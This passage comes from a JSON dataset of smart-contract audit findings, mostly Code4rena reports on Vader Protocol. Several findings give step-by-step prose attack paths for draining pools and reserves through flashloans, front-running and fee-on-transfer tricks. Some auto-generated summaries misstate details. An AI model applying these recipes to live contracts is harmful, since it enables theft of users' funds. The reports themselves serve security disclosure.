      "summary": "\nA vulnerability has been discovered in the Vader Reserve, allowing it to be drained of funds. This is achieved by creating a pool with a token which starts off with a very low price in terms of VADER and is guaranteed to have a very high price in terms of VADER. This allows an attacker to reap a large amount of IL protection funds from the reserve. The attack involves flashloaning a large amount of VADER, deploying a token, adding liquidity to a new pool with a large amount of VADER and a small amount of the token, minting the token to buy up all the VADER in the pool, and finally repaying the flashloan. The attacker will then be able to cash in the LP position for a payday of up to the amount of VADER they initially added to the pool.\n\nTo mitigate this vulnerability, a whitelist should be added to the pairs which qualify for IL protection. This would prevent the attack by ensuring that only certain token pairs are eligible for IL protection.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/34",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "989",
      "title": "[H-04] TwapOracle doesn’t calculate VADER:USDV exchange rate correctly",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrench\n\n\n## Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L156\n\nOn L156 of `TwapOracle` we perform the calculation:\n\n```\nresult = ((sumUSD * IERC20Metadata(token).decimals()) / sumNative);\n```\n\nThis seems extremely odd as for an 18 decimal token we're then calculating \n\n```\nresult = ((sumUSD * 18) / sumNative);\n```\n\nThis is just plain weird. I expect what was meant is to replace this line with the below so we're properly scaling for `token`'s number of decimals.\n\n```\nuint256 scalingFactor = 10 ** IERC20Metadata(token).decimals()\nresult = (sumUSD * scalingFactor) / sumNative;\n```\n\nMarked as high severity as this exchange rate appears to be used in [some form of minting mechanism](https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/tokens/Vader.sol#L18-L19) and correctness of the oracle is listed as one of the key focuses of the audit.\n\n## Recommended Mitigation Steps\n\nAs above.",
      "summary": "\nThis bug report is about a vulnerability found in the TwapOracle contract of the code-423n4/2021-11-vader repository. The vulnerability is located on line 156 of the contract, where the calculation for the exchange rate is incorrect. This could lead to incorrect minted tokens as the exchange rate is used in a minting mechanism. The severity of this vulnerability is marked as high, as the correctness of the oracle is a key focus of the audit. The recommended mitigation steps for this vulnerability is to replace the incorrect calculation with the correct one, which is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/19",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "988",
      "title": "[H-03] VADER contains a Fee-On-Transfer",
      "impact": "HIGH",
      "content": "_Submitted by jayjonah8, also found by rfa, shri4net, and xYrYuYx_\n\n#### Impact\n\nThe whitepaper says that the Vader token contains a Fee-On-Transfer so in XVader.sol, an attacker may be able to keep calling `enter()` and `leave()` while being credited more tokens than the contract actually receives eventually draining it.\n\n#### Proof of Concept\n\n1.  Attacker deposits 500 Vader\n2.  Attacker receives credit for 500 while the xVader contract gets the 500 - fee.\n3.  Attacker calls `leave()` leaving the contract with a difference of the fee.\n\n- <https://www.financegates.net/2021/07/28/another-polygon-yield-farm-crashes-to-zero-after-exploit/>\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/x-vader/XVader.sol>\n\n- <https://www.vaderprotocol.io/whitepaper>\n\n#### Tools Used\n\nManually code review\n\n#### Recommended Mitigation Steps\n\nThere should be pre and post checks on balances to get the real amount\n\n**[0xstormtrooper (Vader) acknowledged](https://github.com/code-423n4/2021-11-vader-findings/issues/11#issuecomment-969525646):**\n > Vader fee on transfer will be removed\n\n\n\n",
      "summary": "\nA bug report has been submitted by jayjonah8 regarding an exploit that could be used to drain a token contract. According to the whitepaper, the Vader token contains a Fee-On-Transfer so an attacker may be able to call enter() and leave() while being credited more tokens than the contract actually receives. This could eventually drain the contract. The proof of concept involved the attacker depositing 500 Vader and receiving credit for 500 while the xVader contract gets the 500 - fee, followed by the attacker calling leave() leaving the contract with a difference of the fee. The bug was discovered through manually code review and the recommended mitigation step is to have pre and post checks on balances to get the real amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/11",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "xYrYuYx",
        "jayjonah8",
        "shri4net",
        "rfa"
      ]
    },
    {
      "id": "987",
      "title": "[H-02] Redemption value of synths can be manipulated to drain VaderPool of all native assets",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrench\n\n\n## Vulnerability details\n\n## Impact\n\nDraining of funds from `VaderPool`\n\n## Proof of Concept\n\nSee the `VaderPool.mintSynth` function:\nhttps://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\n\nAs the pool's reserves can be manipulated through flashloans similar to on UniswapV2, an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\n\n1. The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.\n2. The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.\n3. The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.\n4. The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.\n\nFor the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.\n\n## Recommended Mitigation Steps\n\nPrevent minting of synths or at the very least tie the exchange rate to a manipulation resistant oracle.",
      "summary": "\nThis bug report details an exploit that allows an attacker to drain funds from a pool called `VaderPool`. The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. This makes the pool think `nativeAsset` is extremely valuable. The attacker then uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable, the attacker will receive a huge amount of synths. The attacker can then manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. The attacker now burns all of their synths and extracts a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable. To mitigate this vulnerability, it is recommended to prevent minting of synths or tie the exchange rate to a manipulation resistant oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/3",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "986",
      "title": "[H-01] Minting and burning synths exposes users to unlimited slippage",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by cmichel_\n\n#### Impact\n\nThe amount of synths minted / assets received when minting or burning synths can be manipulated to an unlimited extent by manipulating the reserves of the pool\n\n#### Proof of Concept\n\nSee `VaderPool.mintSynth`:\n<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>\n\nHere a user sends `nativeDeposit` to the pool and the equivalent amount of `foreignAsset` is minted as a synth to be sent to the user. However the user can't specify the minimum amount of synth that they would accept. A frontrunner can then manipulate the reserves of the pool in order to make `foreignAsset` appear more valuable than it really is so the user receives synths which are worth much less than what `nativeDeposit` is worth. This is equivalent to a swap without a slippage limit.\n\nBurning synths essentially runs the same process in behalf so manipulating the pool in the opposite direction will result in the user getting fewer of `nativeAsset` than they expect.\n\n#### Recommended Mitigation Steps\n\nAdd a argument for the minimum amount of synths to mint or nativeAsset to receive.\n\n**[SamSteinGG (Vader) acknowledged and disagreed with severity](https://github.com/code-423n4/2021-11-vader-findings/issues/2#issuecomment-979099464):**\n > We believe the severity should be set to medium as there are no loss of funds and its exploit requires special circumstances to be profitable.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the VaderPool. It was discovered that the amount of synths minted or assets received when minting or burning synths can be manipulated to an unlimited extent by manipulating the reserves of the pool. This means that a user can't specify the minimum amount of synth that they would accept, and a frontrunner can manipulate the reserves of the pool in order to make foreignAsset appear more valuable than it really is. As a result, the user receives synths which are worth much less than what nativeDeposit is worth. This is equivalent to a swap without a slippage limit. Burning synths also runs the same process in behalf, so manipulating the pool in the opposite direction will result in the user getting fewer of nativeAsset than they expect. To mitigate this vulnerability, it is recommended to add a argument for the minimum amount of synths to mint or nativeAsset to receive.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/2",
      "tags": [
        "Slippage"
      ],
      "finders": [
        "cmichel",
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "10894",
      "title": "[L02] Unclean code",
      "impact": "LOW",
      "content": "In the [`lockTokens` function](https://github.com/graphprotocol/contracts/blob/01c891829d39e1d6adc30bf13a2c8bf64504f808/contracts/staking/libs/Stakes.sol#L76) of the `Stakes` contract the [`weightedAverage` function](https://github.com/graphprotocol/contracts/blob/01c891829d39e1d6adc30bf13a2c8bf64504f808/contracts/staking/libs/MathUtils.sol#L17) is called, but it is not clear what function parameters each of its four inputs denote. This is because as the inputs are passed in, their names are not suggestive of, or similar to, the parameters belonging to the function signature of the `weightedAverage` function.\n\n\nThis hinders readability and understanding of the code by auditors or other stakeholders.\n\n\nConsider either documenting as comments in the code the correspondence of each input to parameter or defining and using intermediate variables with suggestive names as inputs.\n\n\n**Update:** *Fixed in [PR465](https://github.com/graphprotocol/contracts/pull/465) at commit [`bead8f1e9f248764eec8f4ae5f627c86da33c78d`](https://github.com/graphprotocol/contracts/pull/465/commits/bead8f1e9f248764eec8f4ae5f627c86da33c78d).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "The Graph – Staking Bugfix #1 Audit",
      "source_link": "https://blog.openzeppelin.com/thegraph-staking-bugfix-audit-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10893",
      "title": "[L01] Lack of input validation",
      "impact": "LOW",
      "content": "The [`collect` function](https://github.com/graphprotocol/contracts/blob/01c891829d39e1d6adc30bf13a2c8bf64504f808/contracts/staking/Staking.sol#L948) of the `Staking` contract does not validate whether the `_tokens` parameter is non-zero.\n\n\nWhen the `_tokens` parameter is zero, the `collect` function can run without error, and emit its `AllocationCollected` event. This provides no useful feedback in the form of a revert message if the parameter was malformed by the client. Furthermore, the emission of the trivial `AllocationCollected` event may confuse off-chain services.\n\n\nIn the case that allowing `collect` to be called on zero `_tokens` was a design choice, consider properly documenting this in the code and other public-facing documentation. Otherwise, consider adding proper checks that the `_tokens` parameter is non-zero.\n\n\n**Update:** *Fixed in commit [`bd06a61e1055a5e0585e8ea64e618a8d6ce65d7c`](https://github.com/graphprotocol/contracts/pull/457/commits/bd06a61e1055a5e0585e8ea64e618a8d6ce65d7c) where the `collect` function now includes documentation describing that zero values of `_tokens` are allowed.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "The Graph – Staking Bugfix #1 Audit",
      "source_link": "https://blog.openzeppelin.com/thegraph-staking-bugfix-audit-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42169",
      "title": "[M-17] `Vader.redeemToMember()` vulnerable to front running",
      "impact": "MEDIUM",
      "content": "\nThe USDV balance of the Vader contract is vulnerable to theft through the `Vader.redeemToMember()` function. A particular case is through USDV redemption front-running. Users can redeem USDV for Vader through the `USDV.redeemForMember()` function or the `Vader.redeemToMember()` function. In the case of `Vader.redeemToMember()`, a user would need to send their USDV to the contract before redemption. However, as this process does not happen in a single call, the victim's call is vulnerable to front running and could have their redeemed USDV stolen by an attacker.\n\nUser's redeem USDV could be stolen by an attacker front running their `Vader.redeemToMember()` call.\n\nThe steps are as follows:\n\n1) User sends USDV to Vader contract to be redeemed\n2) User calls `Vader.redeemToMember()`\n3) The `Vader.redeemToMember()` call is detected by an attacker, who front-runs the call by calling `Vader.redeemToMember()` specifying their own address as the member parameter.\n4) The full USDV balance of the Vader contract is redeemed and sent to the attacker.\n\nNote that while this particular case is front running a redemption call, any USDV balance could be stolen in this manner. Please find the POC showing the above steps here: https://gist.github.com/toastedsteaksandwich/39bfed78b21d7e6c02fe13ea5b2023c3\n\n\nRecommend that the `Vader.redeemToMember()` function should be restricted so that only the USDV contract can call it. Moreover, the amount parameter from `USDV.redeem()` or `USDV.redeemForMember()` should also be passed to `Vader.redeemToMember()` to avoid the need to sweep the entire USDV balance. In this way, the member's redemption happens in a single tx, and would only be allocated as much Vader as redeemed in USDV.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/36#issuecomment-827577253):**\n > Vader complies with a monetary security policy of \"money in, money out\". Contracts will only send out funds if they are first sent funds.\n>\n> This is the case for the entire system, not just `Vader.redeemToMember()`, such as swaps and adding liquidity. Vader is not designed to be interacted with directly, it should be wrapped. In this case, users should convert and redeem only thru the USDV contract, which first sends funds.\n>\n> Incidentally this is the same mechanism that uniswap employs for withdrawing liquidity, or syncing funds to balances. You can also get front-runned if you do it in two tx, it should be wrapped in 1 tx.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/36#issuecomment-830582247):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 0\n\n",
      "summary": "\nThe report discusses a vulnerability in the Vader contract that could potentially lead to users' USDV balance being stolen by an attacker. This can happen when a user tries to redeem USDV for Vader using the `Vader.redeemToMember()` function. The steps for this are: 1) User sends USDV to the contract, 2) User calls `Vader.redeemToMember()`, 3) Attacker detects the call and front-runs it, 4) Attacker receives the full USDV balance of the contract. This vulnerability can also occur in other instances where USDV is redeemed. The report recommends restricting the `Vader.redeemToMember()` function and passing the amount parameter from `USDV.redeem()` or `USDV.redeemForMember()` to avoid the need for sweeping the entire USDV balance. The severity of this vulnerability is considered low and the report suggests following the protocol's monetary security policy and wrapping interactions with the Vader contract in a single transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/36",
      "tags": [],
      "finders": []
    },
    {
      "id": "42168",
      "title": "[M-15] `changeDAO` should be a two-step process in Vader.sol",
      "impact": "MEDIUM",
      "content": "\n`changeDAO()` updates DAO address in one-step. If an incorrect address is mistakenly used (and voted upon) then future administrative access or recovering from this mistake is prevented because `onlyDAO` modifier is used for `changeDAO()`, which requires `msg.sender` to be the incorrectly used DAO address (for which private keys may not be available to sign transactions). See [finding #6 from Trail of Bits audit of Hermez Network](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf).\n\nRecommend using a two-step process where the old DAO address first proposes new ownership in one transaction; and then, accepts ownership from the newly proposed DAO address in a second transaction. A mistake in the first step can be recovered by granting with a new correct address again before the new DAO address accepts ownership. Ideally, there should also be a timelock enforced before the new DAO takes effect.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/162#issuecomment-830607270):**\n > A lot has to go wrong to get to this point, so disagree with severity (funds not at risk).\n>\n> Two step-process seems wise though.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/162#issuecomment-847850118):**\n > Risk lowered because of the extremely low probability\n\n",
      "summary": "\nThe report discusses a bug in the Hermez Network where using an incorrect address in the `changeDAO()` function can prevent future administrative access or recovery. This is because the function requires `msg.sender` to be the incorrect DAO address, which may not have access to the private keys needed to sign transactions. The report recommends using a two-step process to prevent this issue, where the old DAO address first proposes new ownership and then accepts it from the newly proposed address. It is also suggested to have a timelock before the new DAO takes effect. The severity of the bug is debated, with some team members stating that it is unlikely to occur and therefore not a major risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/162",
      "tags": [],
      "finders": []
    },
    {
      "id": "42167",
      "title": "[M-14] Pool functions can be called before initialization in _`init_()` of Pools.sol",
      "impact": "MEDIUM",
      "content": "\nAll the external/public functions of `Pools.sol` can be called by other contracts even before `Pools.sol`contract is initialized. This can lead to exceptions, state corruption or incorrect accounting in other contracts, which may require redeployment of said contract.\n\nRecommend using a factory pattern that will deploy and initialize atomically to prevent front-running of the initialization,\n\nOR\n\nGiven that contracts are not using `delegatecall` proxy pattern, it is not required to use a separate `init()` function to initialize parameters when the same can be done in a constructor. If the reason for doing so is to get the deployment addresses of the various contracts, which may not all be available at the same time, then consider rearchitecting to create a “globals” contract which can hold all the globally required addresses of various contracts. see [Maple protocol’s](https://github.com/maple-labs/maple-core/blob/develop/contracts/MapleGlobals.sol) for example.\n\nOR\n\nPrevent external/public functions from being called until after initialization is done by checking initialization state tracked by the inited variable.\n\n**[strictly-scarce (vader) dipsuted](https://github.com/code-423n4/2021-04-vader-findings/issues/114#issuecomment-830598388):**\n > https://github.com/code-423n4/2021-04-vader-findings/issues/39\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/114#issuecomment-847769580):**\n > Same general comments apply to this issue as with issue #18, but it is a separate type of exploit that would be slightly less detectable. This increase in risk is balanced against the exploit being much harder to effect and the likely impact being lower.\n\n",
      "summary": "\nThe `Pools.sol` contract has a bug where external/public functions can be called by other contracts before `Pools.sol` is initialized. This can cause problems such as exceptions, corrupted state, or incorrect accounting in other contracts, which may require redeployment. To fix this, it is recommended to use a factory pattern that deploys and initializes atomically to prevent front-running of initialization. Alternatively, if contracts are not using `delegatecall` proxy pattern, it is not necessary to use a separate `init()` function for initialization. Instead, consider creating a \"globals\" contract to hold all the globally required addresses of various contracts. Another solution is to prevent external/public functions from being called until after initialization is complete by tracking the initialization state with the `inited` variable. This bug was reported by strictly-scarce (vader) and can be found at https://github.com/code-423n4/2021-04-vader-findings/issues/114#issuecomment-830598388. Judge dmvt also commented on the issue, stating that while this type of exploit is harder to execute and has a lower impact, it is still a risk that should be addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/114",
      "tags": [],
      "finders": []
    },
    {
      "id": "42166",
      "title": "[M-12] Transfer fee avoidance",
      "impact": "MEDIUM",
      "content": "\nThe `Vether4.addExcluded()` function on mainnet (0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279) allows a user to exclude an address from transfer fees for a cost of 128 VETH. By exploiting the conditions in which fees are taken, it is possible to set up a contract for a once-off cost in which all users can use to avoid transfer fees.\n\n#All transfer fees can be avoided by routing transfers through an excluded contract. An estimated \\$140k of transfer fees was accumulated at the time of writing. These fees can be avoided in future, causing an indirect loss of funds for the contract.\n\nRecommend that the `_transfer()` function should be updated to only exclude transfer fees if the sender has been excluded, not both the sender and the recipient. This would prevent any user from being able to set up a central transfer forwarder as demonstrated. Moreover, the `Transfer(_from, address(this), _fee);` event should only be emitted if the sender has been excluded from transfer fees.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/33)**\n\n",
      "summary": "\nThe `Vether4.addExcluded()` function on the mainnet allows users to exclude an address from transfer fees for a cost of 128 VETH. However, this function can be exploited to set up a contract that allows all users to avoid transfer fees for a one-time cost. This has resulted in an estimated loss of $140k in transfer fees. To prevent this, the `_transfer()` function should be updated to only exclude transfer fees for the sender, not both the sender and recipient. Additionally, the `Transfer(_from, address(this), _fee);` event should only be emitted if the sender has been excluded from transfer fees. This issue has been reported and is being disputed by a user named strictly-scarce (vader).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/33",
      "tags": [],
      "finders": []
    },
    {
      "id": "42165",
      "title": "[M-10] Incorrect operator used in `deploySynth()` of `Pools.sol`",
      "impact": "MEDIUM",
      "content": "\nThe `deploySynth()` function in `Pools.sol` is expected to perform a check on the token parameter to determine that it is neither VADER or USDV before calling Factory’s `deploySynth()` function.\n\nHowever, the `require()` incorrectly uses the ‘||’ operator instead of ‘&&’ which allows both VADER and USDV to be supplied as the token parameters. This will allow an attacker to deploy either VADER or USDV as a Synth which will break assumptions throughout the entire protocol. Protocol will break and funds may be lost.\n\nRecommend changing ‘||’ operator to ‘&&’ in the require statement:\n```require(token != VADER && token != USDV);```\n\n**[strictly-scarce (vader) addressed](https://github.com/code-423n4/2021-04-vader-findings/issues/124#issuecomment-830601704):**\n > Duplicate\n> https://github.com/code-423n4/2021-04-vader-findings/issues/21\n\n**[0xBrian commented](https://github.com/code-423n4/2021-04-vader-findings/issues/124#issuecomment-837805692):**\n > https://github.com/vetherasset/vaderprotocol-contracts/pull/159/commits/2f69f8317ce98846fbe227a3bf6ca1b644d01ff2#diff-5de3130299a0ddc914d7a906802a4cc093ed18d7a89c52a4aafefc8a11ac3f54R193\n\n\n",
      "summary": "\nThe `deploySynth()` function in `Pools.sol` has a bug that allows an attacker to deploy either VADER or USDV as a Synth, breaking assumptions throughout the entire protocol and potentially leading to loss of funds. This is because the `require()` statement incorrectly uses the ‘||’ operator instead of ‘&&’. The bug has been identified and a recommendation has been made to change the ‘||’ operator to ‘&&’ in the require statement. This bug has been reported and is being addressed by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/124",
      "tags": [],
      "finders": []
    },
    {
      "id": "42164",
      "title": "[M-04] `flashProof` is not flash-proof",
      "impact": "MEDIUM",
      "content": "\nThe `flashProof` modifier is supposed to prevent flash-loan attacks by disallowing performing several sensitive functions in the same block.\n\nHowever, it performs this check on `tx.origin` and not on an individual user address basis. This only prevents flash loan attacks from happening within a single transaction.\n\nBut flash loan attacks are theoretically not limited to the same transaction but to the same block as miners have full control of the block and include several vulnerable transactions back to back. (Think transaction _bundles_ similar to flashbot bundles that most mining pools currently offer.)\n\nA miner can deploy a proxy smart contract relaying all contract calls and call it from a different EOA each time bypassing the `tx.origin` restriction.\n\nThe `flashProof` modifier does not serve its purpose.\n\nRecommend trying to apply the modifier to individual addresses that interact with the protocol instead of `tx.origin`.\n\nFurthermore, attacks possible with flash loans are usually also possible for whales, making it debatable if adding flash-loan prevention logic is a good practice.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/218#issuecomment-830616044):**\n > Flash loans with the help of miners *was not intended to be countered*, although a check for `msg.sender` AND `tx.origin` will be applied.\n\n",
      "summary": "\nThe `flashProof` modifier is not working properly and does not prevent flash loan attacks as intended. It only checks for the `tx.origin` address, which can be bypassed by miners using different addresses in the same block. This defeats the purpose of the modifier and it is recommended to apply it to individual user addresses instead. It is also debatable if adding flash loan prevention logic is necessary since similar attacks can also be carried out by whales. The team has acknowledged the issue and will make changes to the modifier in the future. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/218",
      "tags": [],
      "finders": []
    },
    {
      "id": "42163",
      "title": "[M-03] Lack of input validation in `replacePool()` allows curated pool limit bypass in `Router.sol`",
      "impact": "MEDIUM",
      "content": "\nThere is no input validation in `replacePool()` function to check if `oldToken` exists and is curated. Using a non-existing `oldToken` (even 0 address) passes the check on L236 (because `Pools.getBaseAmount()` will return 0 for the non-existing token) and `newToken` will be made curated. This can be used to bypass the `curatedPoolLimit` enforced only in `curatePool() function`.\n\nRecommend checking if `oldToken` exists and is curated as part of input validation in `replacePool()` function.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/87#issuecomment-830613505):**\n > Valid\n\n",
      "summary": "\nThe `replacePool()` function does not have proper input validation, which means that a non-existing or non-curated `oldToken` can be used to bypass the `curatedPoolLimit` in the `curatePool()` function. This is because the function does not check if the `oldToken` exists and is curated before allowing the `newToken` to be made curated. It is recommended to add input validation in the `replacePool()` function to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/87",
      "tags": [],
      "finders": []
    },
    {
      "id": "42162",
      "title": "[M-02] Undefined behavior for DAO and GRANT vote proposals in `DAO.sol`",
      "impact": "MEDIUM",
      "content": "\nGiven that there are only three proposal types (GRANT, UTILS, REWARD) that are actionable, it is unclear if 'DAO' type checked in `voteProposal()` is a typographical error and should really be 'GRANT'. Otherwise, GRANT proposals will only require quorum (33%) and not majority (50%).\n\nRecommend changing ‘DAO’ on L83 to ‘GRANT’ or if not, specify what DAO proposals are and how GRANT proposals should be handled with quorum or majority.\n\nAlso, check and enforce that `mapPID_types` are only these three actionable proposal types: GRANT, UTILS, REWARD.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/183#issuecomment-830615194):**\n > DAO not yet fully implemented\n\n",
      "summary": "\nThe bug report is about a potential error in the code that handles proposals. Currently, there are only three types of proposals that can be acted upon: GRANT, UTILS, and REWARD. However, there is a line of code that checks for a fourth type called 'DAO'. It is unclear if this is a mistake and should actually be 'GRANT', or if there is another type of proposal called 'DAO' that has not been fully implemented yet. \n\nThe report suggests changing the code to either specify 'GRANT' or to explain what 'DAO' proposals are and how they should be handled. Additionally, it recommends checking and enforcing that only the three known proposal types are allowed. \n\nThe person who reported the bug has acknowledged that 'DAO' is not yet fully implemented, indicating that it is likely a mistake and should be changed to 'GRANT'. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/183",
      "tags": [],
      "finders": []
    },
    {
      "id": "42161",
      "title": "[M-01] User may not get IL protection if certain functions are called directly in `Pools.sol`",
      "impact": "MEDIUM",
      "content": "\nFunctions `removeLiquidity()` and `removeLiquidityDirectly()` when called directly, do not provide the the user with IL protection unlike when calling the corresponding `removeLiquidity()` function in `Router.sol`. This should be prevented, at least for `removeLiquidity()` or highlighted in the specification and user documentation.\n\nRecommend adding access control (e.g. via a modifier `onlyRouter`) so `removeLiquidity()` function of Pools contract can be called only from corresponding Router contract’s `removeLiquidity()` function which provides IL protection. Alternatively, highlight in the specification and user documentation about which contract interfaces provide IL protection to users.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/120#issuecomment-830613596):**\n > User should use the Router, as designed.\n\n",
      "summary": "\nThe functions `removeLiquidity()` and `removeLiquidityDirectly()` do not provide IL (impermanent loss) protection when called directly, unlike when called through the corresponding `removeLiquidity()` function in `Router.sol`. This issue should be addressed by either adding access control through a modifier or clearly stating in the specification and user documentation which contract interfaces provide IL protection. The developer has acknowledged this issue and recommends using the Router as it was designed for proper IL protection.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/120",
      "tags": [],
      "finders": []
    },
    {
      "id": "42160",
      "title": "[H-21] Anyone Can Avoid All Vether Transfer Fees By Adding Their Address to the Vether `ExcludedAddresses` List.",
      "impact": "HIGH",
